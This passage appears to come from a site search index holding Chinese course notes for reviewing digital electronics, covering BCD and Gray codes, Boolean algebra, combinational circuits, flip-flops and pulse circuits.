1100 1001 1101 0101 7 0111 1010 1101 1010 1111 0100 8 1000 1011 1110 1011 1110 1100 9 1001 1100 1111 1100 1010 1101 10 1111 11 1110 12 1010 13 1011 14 1001 15 1000 \u4f59 3 \u7801 \u4f593\u7801\u662f8421 BCD\u7801\u7684\u6bcf\u4e2a\u7801\u7ec4\u52a03(0011)\u5f62\u6210\u7684\u3002\u5e38\u7528\u4e8eBCD\u7801\u7684\u8fd0\u7b97\u7535\u8def\u4e2d\u3002 \u4f593\u5faa\u73af\u7801 \u4f593\u5faa\u73af\u7801\u662f\u65e0\u6743\u7801\uff0c\u5373\u6bcf\u4e2a\u7f16\u7801\u4e2d\u76841\u548c0\u6ca1\u6709\u786e\u5207\u7684\u6743\u503c\uff0c\u6574\u4e2a\u7f16\u7801\u76f4\u63a5\u4ee3\u8868\u4e00\u4e2a\u6570\u503c\u3002\u4e3b\u8981\u4f18\u70b9\u662f\u76f8\u90bb\u7f16\u7801\u53ea\u6709\u4e00\u4f4d\u53d8\u5316\uff0c\u907f\u514d\u4e86\u8fc7\u6e21\u7801\u4ea7\u751f\u7684 \u566a\u58f0 \u3002\u5341\u8fdb\u5236\u6570\u7684\u4f593\u5faa\u73af\u7801\u5c31\u662f\u53d64\u4f4d\u683c\u96f7\u7801\u4e2d\u7684\u5341\u4e2a\u4ee3\u7801\u7ec4\u6210\u7684\u3002 \u683c\u96f7\u7801 \u5728\u4e00\u7ec4\u6570\u7684\u7f16\u7801\u4e2d\uff0c\u82e5\u4efb\u610f\u4e24\u4e2a\u76f8\u90bb\u7684\u4ee3\u7801\u53ea\u6709\u4e00\u4f4d\u4e8c\u8fdb\u5236\u6570\u4e0d\u540c\uff0c\u5219\u79f0\u8fd9\u79cd\u7f16\u7801\u4e3a\u683c\u96f7\u7801\uff08Gray Code\uff09\uff0c\u53e6\u5916\u7531\u4e8e\u6700\u5927\u6570\u4e0e\u6700\u5c0f\u6570\u4e4b\u95f4\u4e5f\u4ec5\u4e00\u4f4d\u6570\u4e0d\u540c\uff0c\u5373 \u9996\u5c3e\u76f8\u8fde \uff0c\u56e0\u6b64\u53c8\u79f0\u5faa\u73af\u7801\u6216\u53cd\u5c04\u7801\u3002 \u5728\u6570\u5b57\u7cfb\u7edf\u4e2d\uff0c\u5e38\u8981\u6c42\u4ee3\u7801\u6309\u4e00\u5b9a\u987a\u5e8f\u53d8\u5316\u3002\u4f8b\u5982\uff0c\u6309\u81ea\u7136\u6570\u9012\u589e\u8ba1\u6570\uff0c\u82e5\u91c7\u75288421\u7801\uff0c\u5219\u65700111\u53d8\u52301000\u65f6\u56db\u4f4d\u5747\u8981\u53d8\u5316\uff0c\u800c\u5728\u5b9e\u9645\u7535\u8def\u4e2d\uff0c4\u4f4d\u7684\u53d8\u5316\u4e0d\u53ef\u80fd\u7edd\u5bf9\u540c\u65f6\u53d1\u751f\uff0c\u5219\u8ba1\u6570\u4e2d\u53ef\u80fd\u51fa\u73b0\u77ed\u6682\u7684\u5176\u5b83\u4ee3\u7801\uff081100\u30011111\u7b49\uff09\u3002\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u53ef\u80fd\u5bfc\u81f4\u7535\u8def\u72b6\u6001\u9519\u8bef\u6216\u8f93\u5165\u9519\u8bef\u3002\u4f7f\u7528\u683c\u96f7\u7801\u53ef\u4ee5\u907f\u514d\u8fd9\u79cd\u9519\u8bef\u3002\u683c\u96f7\u7801\u6709\u591a\u79cd\u7f16\u7801\u5f62\u5f0f\u3002 1.3. \u53cd\u51fd\u6570\u3001\u5bf9\u5076\u5f0f\u7684\u5b9a\u4e49\u53ca\u6c42\u6cd5 # \u5bf9\u5076\u5f0f \u5728\u903b\u8f91\u4ee3\u6570\u4e2d\u7684\u5bf9\u5076\u5f0f\uff1a\u5982\u679c\u5c06\u903b\u8f91\u51fd\u6570\u8868\u8fbe\u5f0f F \u4e2d\u6240\u6709\u7684 \u00b7 (\u4e0e) \u53d8\u6210 + \uff08\u6216\uff09 \uff0c + \u53d8\u6210 \u00b7 \uff0c 0 \u53d8\u6210 1 \uff0c 1 \u53d8\u6210 0 \uff0c\u5e76\u4fdd\u6301\u539f\u51fd\u6570\u4e2d\u7684\u8fd0\u7b97\u987a\u5e8f\u4e0d\u53d8\uff0c\u5219\u6240\u5f97\u5230\u7684\u65b0\u7684\u903b\u8f91\u8868\u8fbe\u5f0f\u79f0\u4e3a\u51fd\u6570 F \u7684\u5bf9\u5076\u5f0f\uff0c\u5e76\u8bb0\u4f5c F' \u3002 \u5982 F = A(\\bar{B} + C) F' = A + \\bar{B}C \u53cd\u51fd\u6570 \u5728\u5bf9\u5076\u5f0f\u7684\u57fa\u7840\u4e0a\uff0c\u6bcf\u4e2a\u539f\u53d8\u91cf\u53d8\u6210\u5176\u53cd\u53d8\u91cf\u3002 \\bar{F} = \\bar{A} + B\\bar{C} 1.4. \u4ee3\u6570\u6cd5\u5316\u7b80 # \u540d\u79f0 \u516c\u5f0f1 \u516c\u5f0f2 0-1\u5f8b A \\cdot 1 = A A + 0 = A 0-1\u5f8b A \\cdot 0 = 0 A + 1 = 1 \u4e92\u8865\u5f8b A\\bar{A} = 0 A + \\bar{A} = 1 \u91cd\u53e0\u5f8b AA = A A + A = A \u4ea4\u6362\u5f8b AB = BA A + B = B + A \u7ed3\u5408\u5f8b A(BC) = (AB)C A + (B + C) = (A + B) + C \u5206\u914d\u5f8b (A + B)C = AC + BC AB+ C = (A + C)(B + C) \u53cd\u6f14\u5f8b \\overline{AB} = \\bar{A} + \\bar{B} \\overline{A + B} = \\bar{A}\\bar{B} \u5438\u6536\u5f8b A(A +B) = A A + AB = A \u5438\u6536\u5f8b A(\\bar{A} +B) = AB A + \\bar{A}B = A + B \u5438\u6536\u5f8b (A + B)(\\bar{A} + C)(B + C) = (A + B)(\\bar{A} + C) AB + \\bar{A}C + BC= AB + \\bar{A}C \u5bf9\u5408\u5f8b \\overline{\\overline A} = A 1.5. \u5361\u8bfa\u56fe\u5316\u7b80 # 3\u4e2a\u8868\u8fbe\u5f0f 4\u4e2a\u8868\u8fbe\u5f0f 1.6. \u95e8\u7535\u8def\u53ca\u7b26\u53f7\u3001\u903b\u8f91\u5173\u7cfb # \u5f02\u6216\uff1a L = A \\oplus B = \\bar{A}B + A\\bar{B} 2. \u7ec4\u5408\u903b\u8f91\u7535\u8def # 2.1. \u5206\u6790 # \u4e00\u822c\u6b65\u9aa4\uff1a\u903b\u8f91\u56fe \\to \u8868\u8fbe\u5f0f \\to \u5316\u7b80 \\to \u771f\u503c\u8868 2.2. \u8bbe\u8ba1 # \u4e00\u822c\u6b65\u9aa4\uff1a\u6ce2\u5f62\u56fe\u6216\u903b\u8f91\u547d\u9898 \\to \u771f\u503c\u8868 \\to \u8868\u8fbe\u5f0f \\to \u5316\u7b80\uff08\u53d8\u6362\uff09 \\to \u903b\u8f91\u56fe 2.3. \u4e2d\u89c4\u6a21\u96c6\u6210\u7535\u8def\u7684\u5e94\u7528 # 2.3.1. \u7f16\u7801\u5668 # 8 \u7ebf- 3 \u7ebf\u4f18\u5148\u7f16\u7801\u5668 CD4532 \u7684\u529f\u80fd\u8868\u5982\u4e0b\u56fe\u6240\u793a\u3002 CD4532\u7684\u903b\u8f91\u7b26\u53f7\u56fe\u548c\u5f15\u811a\u56fe\u3002 \u8003\u5bdf\u8f93\u5165\u8f93\u51fa\u7684\u9ad8\u4f4e\u7535\u5e73\u6709\u6548\u7684\u542b\u4e49\u3002 2.3.2. \u8bd1\u7801\u5668 # 2\u7ebf-4\u7ebf\u8bd1\u7801\u5668\uff08139\uff09 3\u7ebf-8\u7ebf\u8bd1\u7801\u5668\uff08138\uff09 \u5f53\u8f93\u5165\u8d85\u8fc7 8421BCD \u7801\u7684\u8868\u793a\u8303\u56f4\u65f6\uff08\u5373 1010 \\sim 1111 \uff09\uff0c\u8f93\u51fa\u4e3a\u5168\u90e8\u9ad8\u7535\u5e73\uff0c\u5373\u6ca1\u6709\u6709\u6548\u8bd1\u7801\u8f93\u51fa\u3002 2.3.3. \u6570\u636e\u9009\u62e9\u5668 # 4\u90091\u6570\u636e\u9009\u62e9\u5668\uff08153\uff09 8\u90091\u6570\u636e\u9009\u62e9\u5668\uff08151\uff09 2.3.4. \u4f7f\u80fd\u7aef\uff08\u7247\u9009\u7aef\uff09\u7684\u7528\u9014 # \u6269\u5c55 \u6392\u9664\u5192\u9669 \u7ade\u4e89 \uff1a\u5f53\u4e00\u4e2a\u903b\u8f91\u95e8\u7535\u8def\u7684\u4e24\u4e2a\u8f93\u5165\u7aef\u7684\u4fe1\u53f7\u540c\u65f6\u5411\u76f8\u53cd\u65b9\u5411\u53d8\u5316\uff0c\u800c\u53d8\u5316\u7684\u65f6\u95f4\u6709\u5dee\u5f02\u7684\u73b0\u8c61\uff0c\u6210\u4e3a\u7ade\u4e89\u3002 \u5192\u9669 \uff1a\u7531\u7ade\u4e89\u800c\u53ef\u80fd\u4ea7\u751f\u8f93\u51fa\u5e72\u6270\u8109\u51b2\u6ce2\u5f62\u7684\u73b0\u8c61\u6210\u4e3a\u5192\u9669\u3002 \u6d88\u53bb\u7ade\u4e89\u5192\u9669\u7684\u65b9\u6cd5\uff1a \u53d1\u73b0\u5e76\u6d88\u9664\u4e92\u8865\u76f8\u4e58\u9879 \u589e\u52a0\u4e58\u79ef\u9879\u4ee5\u907f\u514d\u4e92\u8865\u9879\u76f8\u52a0 \u8f93\u51fa\u7aef\u5e76\u8054\u7535\u5bb9\u5668 3. \u65f6\u5e8f\u903b\u8f91\u7535\u8def # 3.1. \u9501\u5b58\u5668\u3001\u89e6\u53d1\u5668 # SR \u9501\u5b58\u5668 \u7535\u8def\u6709\u4e24\u4e2a\u8f93\u5165\u7aef\uff0c\u5176\u4e2dS\u7aef\u79f0\u4e3a\u7f6e\u4f4d\uff081\uff09\u7aef\uff0cR\u7aef\u79f0\u4e3a\u590d\u4f4d\u7aef\u6216\u6e05\u96f6\uff080\uff09\u7aef\uff0c\u8f93\u51fa\u7aef Q \u548c \\bar{Q} \u8868\u8fbe\u5f0f\u4e3a Q = \\overline{R + \\bar{Q}} \\bar{Q} = \\overline{S + Q} \u7528\u6765\u5b9e\u73b0\u5bf9\u8f93\u5165\u7684\u5b58\u50a8\u529f\u80fd\u3002 D \u9501\u5b58\u5668 \u89e6\u53d1 \u5728\u65f6\u949f\u8109\u51b2\u8fb9\u6cbf\u4f5c\u7528\u4e0b\u7684\u72b6\u6001\u5237\u65b0\u79f0\u4e3a\u89e6\u53d1\uff0c\u5177\u6709\u8fd9\u79cd\u7279\u6027\u7684\u5b58\u50a8\u5355\u5143\u7535\u8def\u79f0\u4e3a\u89e6\u53d1\u5668\u3002 D \u89e6\u53d1\u5668 \u7279\u6027\u65b9\u7a0b\uff1a Q ^ {n + 1} = D JK \u89e6\u53d1\u5668 Q ^ {n + 1} = J \\bar{Q^n} + \\bar{K} Q^n J= 1, K = 0 \u65f6\uff0c\u89e6\u53d1\u5668\u7684\u4e0b\u4e00\u72b6\u6001\u88ab\u7f6e 1 J= 0, K = 1 \u65f6\uff0c\u89e6\u53d1\u5668\u7684\u4e0b\u4e00\u72b6\u6001\u88ab\u7f6e 0 J= 0, K = 0 \u65f6\uff0c\u89e6\u53d1\u5668\u72b6\u6001\u4fdd\u6301\u4e0d\u53d8 J= 1, K = 1 \u65f6\uff0c\u89e6\u53d1\u5668\u7ffb\u8f6c T \u89e6\u53d1\u5668 Toggle \u89e6\u53d1\u5668\uff0c\u5f53\u63a7\u5236\u4fe1\u53f7 T = 1 \u65f6\uff0c\u6bcf\u6765\u4e00\u4e2a CP \uff08\u6216 \\overline{CP} \uff09\u8109\u51b2\uff0c\u5b83\u7684\u72b6\u6001\u7ffb\u8f6c\u4e00\u6b21\uff1b\u800c\u5f53 T = 0 \u65f6\uff0c\u5219\u4fdd\u6301\u4e0d\u53d8\u3002 Q ^ {n + 1} = T \\overline{Q^n} + \\bar{T} Q^n = T \\oplus Q^n T' \u89e6\u53d1\u5668 \u5f53 T \u89e6\u53d1\u5668\u7684 T \u8f93\u5165\u7aef\u56fa\u5b9a\u63a5\u9ad8\u7535\u5e73\u65f6\uff08\u5373T= 1\uff09\uff0c\u5219 Q ^ {n + 1} = \\overline{Q^n} \u753b\u65f6\u5e8f\u56fe\uff0c\u65f6\u5e8f\u8109\u51b2\uff08\u4e0a\u5347\u6cbf\\\u4e0b\u964d\u6cbf\uff09\u89e6\u53d1\uff0c\u5bf9\u9f50\u7ebf\u3002 \u521d\u6001\uff0c\u6709\u65f6\u753b\u65f6\u5e8f\u56fe\u53ef\u4ee5\u52a0\u5165\u4e2d\u95f4\u53c2\u91cf\u7684\u6ce2\u5f62\u3002 3.2. \u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790 # \u4e00\u822c\u6b65\u9aa4\uff1a \u5206\u6790\u903b\u8f91\u56fe\u3002 \u5bf9\u5e94\u6bcf\u4e2a\u8f93\u51fa\u53d8\u91cf\u5bfc\u51fa\u8f93\u51fa\u65b9\u7a0b\uff0c\u7ec4\u6210\u8f93\u51fa\u65b9\u7a0b\u7ec4\u3002 \u5bf9\u6bcf\u4e2a\u89e6\u53d1\u5668\u5bfc\u51fa\u6fc0\u52b1\u65b9\u7a0b\uff0c\u7ec4\u6210\u6fc0\u52b1\u65b9\u7a0b\u7ec4\u3002 \u5c06\u5404\u89e6\u53d1\u5668\u7684\u6fc0\u52b1\u65b9\u7a0b\u5e26\u5165\u76f8\u5e94\u89e6\u53d1\u5668\u7684\u7279\u6027\u65b9\u7a0b\uff0c\u5f97\u5230\u5404\u89e6\u53d1\u5668\u7684\u72b6\u6001\u65b9\u7a0b\uff0c\u4ece\u800c\u7ec4\u6210\u72b6\u6001\u65b9\u7a0b\u7ec4\u3002 \u6839\u636e\u72b6\u6001\u65b9\u7a0b\u7ec4\u548c\u8f93\u51fa\u65b9\u7a0b\u7ec4\uff0c\u5217\u51fa\u7535\u8def\u7684\u72b6\u6001\u8868\uff0c\u753b\u51fa\u72b6\u6001\u56fe\u548c\u65f6\u5e8f\u56fe\u3002 \u786e\u5b9a\u7535\u8def\u7684\u903b\u8f91\u529f\u80fd\uff0c\u5fc5\u8981\u7684\u8bdd\uff0c\u53ef\u7528\u6587\u5b57\u8be6\u7ec6\u63cf\u8ff0\u3002 \u5982\u679c\u6709\u65e0\u6548\u72b6\u6001\uff0c\u68c0\u67e5\u80fd\u5426\u81ea\u542f\u52a8\u3002 3.3. \u5f02\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790 # 3.4. \u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 # \u4e00\u822c\u6b65\u9aa4\uff1a \u7531\u7ed9\u5b9a\u7684\u903b\u8f91\u529f\u80fd\u5efa\u7acb\u539f\u59cb\u72b6\u6001\u56fe\u548c\u539f\u59cb\u72b6\u6001\u8868 \u72b6\u6001\u5316\u7b80 \u72b6\u6001\u5206\u914d \u9009\u62e9\u89e6\u53d1\u5668\u7c7b\u578b \u786e\u5b9a\u6fc0\u52b1\u65b9\u7a0b\u7ec4\u548c\u8f93\u51fa\u65b9\u7a0b\u7ec4 \u753b\u51fa\u903b\u8f91\u56fe\u5e76\u68c0\u67e5\u81ea\u542f\u52a8\u80fd\u529b 3.5. 74161\u5e94\u7528 # 74LVC161\u662f4\u4f4d\u540c\u6b65\u4e8c\u8fdb\u5236\u52a0\u8ba1\u6570\u5668\u3002 4. \u8109\u51b2\u6ce2\u5f62\u7684\u4ea7\u751f\u4e0e\u53d8\u6362 # 4.1. \u5355\u7a33\u6001\u89e6\u53d1\u5668 # \u5355\u7a33\u6001\u89e6\u53d1\u5668\u5177\u6709\u5982\u4e0b\u7684\u5de5\u4f5c\u7279\u6027\uff1a \u6ca1\u6709\u89e6\u53d1\u8109\u51b2\u4f5c\u7528\u65f6\u7535\u8def\u5904\u4e8e\u4e00\u79cd\u7a33\u5b9a\u72b6\u6001\u3002 \u5728\u89e6\u53d1\u8109\u51b2\u4f5c\u7528\u4e0b\uff0c\u7535\u8def\u7531\u7a33\u6001\u7ffb\u8f6c\u5230\u6682\u7a33\u6001\u3002\u6682\u7a33\u6001\u662f\u4e00\u79cd\u4e0d\u80fd\u957f\u4e45\u4fdd\u6301\u7684\u72b6\u6001\u3002 \u7531\u4e8e\u7535\u8def\u4e2d RC \u5ef6\u65f6\u73af\u8282\u7684\u4f5c\u7528\uff0c\u7535\u8def\u7684\u6682\u7a33\u6001\u5728\u7ef4\u6301\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u4f1a\u81ea\u52a8\u8fd4\u56de\u5230\u7a33\u6001\u3002\u6682\u7a33\u6001\u7684\u6301\u7eed\u65f6\u95f4\u51b3\u5b9a\u4e8e\u7535\u8def\u4e2d\u7684 RC \u53c2\u6570\u503c\u3002 4.2. \u65bd\u5bc6\u7279\u89e6\u53d1\u5668 # \u65bd\u5bc6\u7279\u89e6\u53d1\u5668\u5728\u7535\u5b50\u7535\u8def\u4e2d\u5e38\u7528\u6765\u5b8c\u6210\u6ce2\u5f62\u53d8\u6362\u3001\u5e45\u5ea6\u9274\u522b\u7b49\u5de5\u4f5c\u3002 4.3. \u591a\u8c10\u632f\u8361\u5668 # \u591a\u8c10\u632f\u8361\u5668\u662f\u4e00\u79cd\u5728\u63a5\u901a\u7535\u6e90\u540e\uff0c\u5c31\u80fd\u4ea7\u751f\u4e00\u5b9a\u9891\u7387\u548c\u4e00\u5b9a\u5e45\u503c\u77e9\u5f62\u6ce2\u7684\u81ea\u6fc0\u632f\u8361\u5668\uff0c\u5e38\u4f5c\u4e3a\u8109\u51b2\u4fe1\u53f7\u6e90\u3002\u7531\u4e8e\u591a\u8c10\u632f\u8361\u5668\u5728\u5de5\u4f5c\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u7a33\u5b9a\u72b6\u6001\uff0c\u6545\u53c8\u79f0\u4e3a\u65e0\u7a33\u6001\u7535\u8def\u3002 4.4. 555\u5b9a\u65f6\u5668\u53ca\u5176\u5e94\u7528 #","title":"1.\u590d\u4e60\u5927\u7eb2"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#_1","text":"","title":"\u6570\u5b57\u7535\u5b50\u6280\u672f\u590d\u4e60\u5927\u7eb2"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#_2","text":"\u6570\u5b57\u7535\u5b50\u6280\u672f\u590d\u4e60\u5927\u7eb2 \u76ee\u5f55 1. \u6570\u5b57\u8fd0\u7b97\u57fa\u7840 1.1. \u8fdb\u5236 1.2. \u7f16\u7801 1.3. \u53cd\u51fd\u6570\u3001\u5bf9\u5076\u5f0f\u7684\u5b9a\u4e49\u53ca\u6c42\u6cd5 1.4. \u4ee3\u6570\u6cd5\u5316\u7b80 1.5. \u5361\u8bfa\u56fe\u5316\u7b80 1.6. \u95e8\u7535\u8def\u53ca\u7b26\u53f7\u3001\u903b\u8f91\u5173\u7cfb 2. \u7ec4\u5408\u903b\u8f91\u7535\u8def 2.1. \u5206\u6790 2.2. \u8bbe\u8ba1 2.3. \u4e2d\u89c4\u6a21\u96c6\u6210\u7535\u8def\u7684\u5e94\u7528 2.3.1. \u7f16\u7801\u5668 2.3.2. \u8bd1\u7801\u5668 2.3.3. \u6570\u636e\u9009\u62e9\u5668 2.3.4. \u4f7f\u80fd\u7aef\uff08\u7247\u9009\u7aef\uff09\u7684\u7528\u9014 3. \u65f6\u5e8f\u903b\u8f91\u7535\u8def 3.1. \u9501\u5b58\u5668\u3001\u89e6\u53d1\u5668 3.2. \u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790 3.3. \u5f02\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790 3.4. \u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 3.5. 74161\u5e94\u7528 4. \u8109\u51b2\u6ce2\u5f62\u7684\u4ea7\u751f\u4e0e\u53d8\u6362 4.1. \u5355\u7a33\u6001\u89e6\u53d1\u5668 4.2. \u65bd\u5bc6\u7279\u89e6\u53d1\u5668 4.3. \u591a\u8c10\u632f\u8361\u5668 4.4. 555\u5b9a\u65f6\u5668\u53ca\u5176\u5e94\u7528","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#1","text":"","title":"1. \u6570\u5b57\u8fd0\u7b97\u57fa\u7840"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#11","text":"2\u30018\u300116\u300110\u8fdb\u5236\u53ca\u76f8\u4e92\u8f6c\u6362\u3002","title":"1.1. \u8fdb\u5236"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#12","text":"(\\cdots)_{8421BCD} , (\\cdots)_{5421BCD} , (\\cdots)_{2421 BCD} \u5341\u8fdb\u5236\u6570 8421\u7801 5421\u7801 2421\u7801 \u4f593\u7801 \u4f593\u5faa\u73af\u7801 4\u4f4d\u5178\u578b\u683c\u96f7\u7801 0 0000 0000 0000 0011 0010 0000 1 0001 0001 0001 0100 0110 0001 2 0010 0010 0010 0101 0111 0011 3 0011 0011 0011 0110 0101 0010 4 0100 0100 0100 0111 0100 0110 5 0101 1000 1011 1000 1100 0111 6 0110 1001 1100 1001 1101 0101 7 0111 1010 1101 1010 1111 0100 8 1000 1011 1110 1011 1110 1100 9 1001 1100 1111 1100 1010 1101 10 1111 11 1110 12 1010 13 1011 14 1001 15 1000 \u4f59 3 \u7801 \u4f593\u7801\u662f8421 BCD\u7801\u7684\u6bcf\u4e2a\u7801\u7ec4\u52a03(0011)\u5f62\u6210\u7684\u3002\u5e38\u7528\u4e8eBCD\u7801\u7684\u8fd0\u7b97\u7535\u8def\u4e2d\u3002 \u4f593\u5faa\u73af\u7801 \u4f593\u5faa\u73af\u7801\u662f\u65e0\u6743\u7801\uff0c\u5373\u6bcf\u4e2a\u7f16\u7801\u4e2d\u76841\u548c0\u6ca1\u6709\u786e\u5207\u7684\u6743\u503c\uff0c\u6574\u4e2a\u7f16\u7801\u76f4\u63a5\u4ee3\u8868\u4e00\u4e2a\u6570\u503c\u3002\u4e3b\u8981\u4f18\u70b9\u662f\u76f8\u90bb\u7f16\u7801\u53ea\u6709\u4e00\u4f4d\u53d8\u5316\uff0c\u907f\u514d\u4e86\u8fc7\u6e21\u7801\u4ea7\u751f\u7684 \u566a\u58f0 \u3002\u5341\u8fdb\u5236\u6570\u7684\u4f593\u5faa\u73af\u7801\u5c31\u662f\u53d64\u4f4d\u683c\u96f7\u7801\u4e2d\u7684\u5341\u4e2a\u4ee3\u7801\u7ec4\u6210\u7684\u3002 \u683c\u96f7\u7801 \u5728\u4e00\u7ec4\u6570\u7684\u7f16\u7801\u4e2d\uff0c\u82e5\u4efb\u610f\u4e24\u4e2a\u76f8\u90bb\u7684\u4ee3\u7801\u53ea\u6709\u4e00\u4f4d\u4e8c\u8fdb\u5236\u6570\u4e0d\u540c\uff0c\u5219\u79f0\u8fd9\u79cd\u7f16\u7801\u4e3a\u683c\u96f7\u7801\uff08Gray Code\uff09\uff0c\u53e6\u5916\u7531\u4e8e\u6700\u5927\u6570\u4e0e\u6700\u5c0f\u6570\u4e4b\u95f4\u4e5f\u4ec5\u4e00\u4f4d\u6570\u4e0d\u540c\uff0c\u5373 \u9996\u5c3e\u76f8\u8fde \uff0c\u56e0\u6b64\u53c8\u79f0\u5faa\u73af\u7801\u6216\u53cd\u5c04\u7801\u3002 \u5728\u6570\u5b57\u7cfb\u7edf\u4e2d\uff0c\u5e38\u8981\u6c42\u4ee3\u7801\u6309\u4e00\u5b9a\u987a\u5e8f\u53d8\u5316\u3002\u4f8b\u5982\uff0c\u6309\u81ea\u7136\u6570\u9012\u589e\u8ba1\u6570\uff0c\u82e5\u91c7\u75288421\u7801\uff0c\u5219\u65700111\u53d8\u52301000\u65f6\u56db\u4f4d\u5747\u8981\u53d8\u5316\uff0c\u800c\u5728\u5b9e\u9645\u7535\u8def\u4e2d\uff0c4\u4f4d\u7684\u53d8\u5316\u4e0d\u53ef\u80fd\u7edd\u5bf9\u540c\u65f6\u53d1\u751f\uff0c\u5219\u8ba1\u6570\u4e2d\u53ef\u80fd\u51fa\u73b0\u77ed\u6682\u7684\u5176\u5b83\u4ee3\u7801\uff081100\u30011111\u7b49\uff09\u3002\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u53ef\u80fd\u5bfc\u81f4\u7535\u8def\u72b6\u6001\u9519\u8bef\u6216\u8f93\u5165\u9519\u8bef\u3002\u4f7f\u7528\u683c\u96f7\u7801\u53ef\u4ee5\u907f\u514d\u8fd9\u79cd\u9519\u8bef\u3002\u683c\u96f7\u7801\u6709\u591a\u79cd\u7f16\u7801\u5f62\u5f0f\u3002","title":"1.2. \u7f16\u7801"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#13","text":"\u5bf9\u5076\u5f0f \u5728\u903b\u8f91\u4ee3\u6570\u4e2d\u7684\u5bf9\u5076\u5f0f\uff1a\u5982\u679c\u5c06\u903b\u8f91\u51fd\u6570\u8868\u8fbe\u5f0f F \u4e2d\u6240\u6709\u7684 \u00b7 (\u4e0e) \u53d8\u6210 + \uff08\u6216\uff09 \uff0c + \u53d8\u6210 \u00b7 \uff0c 0 \u53d8\u6210 1 \uff0c 1 \u53d8\u6210 0 \uff0c\u5e76\u4fdd\u6301\u539f\u51fd\u6570\u4e2d\u7684\u8fd0\u7b97\u987a\u5e8f\u4e0d\u53d8\uff0c\u5219\u6240\u5f97\u5230\u7684\u65b0\u7684\u903b\u8f91\u8868\u8fbe\u5f0f\u79f0\u4e3a\u51fd\u6570 F \u7684\u5bf9\u5076\u5f0f\uff0c\u5e76\u8bb0\u4f5c F' \u3002 \u5982 F = A(\\bar{B} + C) F' = A + \\bar{B}C \u53cd\u51fd\u6570 \u5728\u5bf9\u5076\u5f0f\u7684\u57fa\u7840\u4e0a\uff0c\u6bcf\u4e2a\u539f\u53d8\u91cf\u53d8\u6210\u5176\u53cd\u53d8\u91cf\u3002 \\bar{F} = \\bar{A} + B\\bar{C}","title":"1.3. \u53cd\u51fd\u6570\u3001\u5bf9\u5076\u5f0f\u7684\u5b9a\u4e49\u53ca\u6c42\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#14","text":"\u540d\u79f0 \u516c\u5f0f1 \u516c\u5f0f2 0-1\u5f8b A \\cdot 1 = A A + 0 = A 0-1\u5f8b A \\cdot 0 = 0 A + 1 = 1 \u4e92\u8865\u5f8b A\\bar{A} = 0 A + \\bar{A} = 1 \u91cd\u53e0\u5f8b AA = A A + A = A \u4ea4\u6362\u5f8b AB = BA A + B = B + A \u7ed3\u5408\u5f8b A(BC) = (AB)C A + (B + C) = (A + B) + C \u5206\u914d\u5f8b (A + B)C = AC + BC AB+ C = (A + C)(B + C) \u53cd\u6f14\u5f8b \\overline{AB} = \\bar{A} + \\bar{B} \\overline{A + B} = \\bar{A}\\bar{B} \u5438\u6536\u5f8b A(A +B) = A A + AB = A \u5438\u6536\u5f8b A(\\bar{A} +B) = AB A + \\bar{A}B = A + B \u5438\u6536\u5f8b (A + B)(\\bar{A} + C)(B + C) = (A + B)(\\bar{A} + C) AB + \\bar{A}C + BC= AB + \\bar{A}C \u5bf9\u5408\u5f8b \\overline{\\overline A} = A","title":"1.4. \u4ee3\u6570\u6cd5\u5316\u7b80"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#15","text":"3\u4e2a\u8868\u8fbe\u5f0f 4\u4e2a\u8868\u8fbe\u5f0f","title":"1.5. \u5361\u8bfa\u56fe\u5316\u7b80"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#16","text":"\u5f02\u6216\uff1a L = A \\oplus B = \\bar{A}B + A\\bar{B}","title":"1.6. 